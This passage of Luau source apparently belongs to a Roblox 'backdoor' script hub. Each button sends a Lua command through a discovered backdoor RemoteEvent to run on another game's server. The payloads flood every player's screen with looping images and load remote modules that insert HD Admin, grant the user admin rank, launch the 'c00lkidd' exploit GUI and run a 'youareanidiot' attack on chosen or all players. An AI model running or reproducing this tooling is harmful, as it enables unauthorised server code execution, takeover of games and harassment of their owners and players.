			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_d0);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.popups.LocalScript
local function C_d4()
	local script = G2L["d4"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = tostring(script.Parent.Parent.Parent.ID.Text)

		local command = [[
		    for i,v in pairs(game.Players:GetPlayers()) do
			while true do
				wait(0.4)
				local kill = Instance.new("ScreenGui",v.PlayerGui)
				local kill2 = Instance.new("ImageLabel",kill)
				kill2.Size = UDim2.new(0,491,0,372)
				kill2.Position = UDim2.new(0,math.random(1,1000),0,math.random(1,1000))
				kill2.Image = "http://www.roblox.com/asset/?id=]].. ID .. [["
			end
		end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_d4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Exser.LocalScript
local function C_d8()
	local script = G2L["d8"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID

		local command = [[
		    require(74482062740292):pls("]] .. game.Players.LocalPlayer.Name .. [[")
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_d8);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminInsert.LocalScript
local function C_dc()
	local script = G2L["dc"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text

		local command = [[
		      require(11629849037)()
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_dc);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminRank.LocalScript
local function C_e0()
	local script = G2L["e0"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
	        require(11560761226).HD("]] .. game.Players.LocalPlayer.name .. [[")
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_e0);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.c00lgui.LocalScript
local function C_e4()
	local script = G2L["e4"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
		      require(14125553864):Fire("]] .. game.Players.LocalPlayer.Name .. [[","c00lkidd")
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_e4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.youareanidiot.LocalScript
local function C_e8()
	local script = G2L["e8"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text

		local command = [[
	        local Players = game:GetService("Players")
	        local txtt = "]] .. txt .. [["
	        if txtt == "all" then
	            for _, player in pairs(Players:GetPlayers()) do
	                require(8222129769).youareanidiot(player.Name)
	            end
	        else
	            require(8222129769).youareanidiot(txtt)
	        end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_e8);
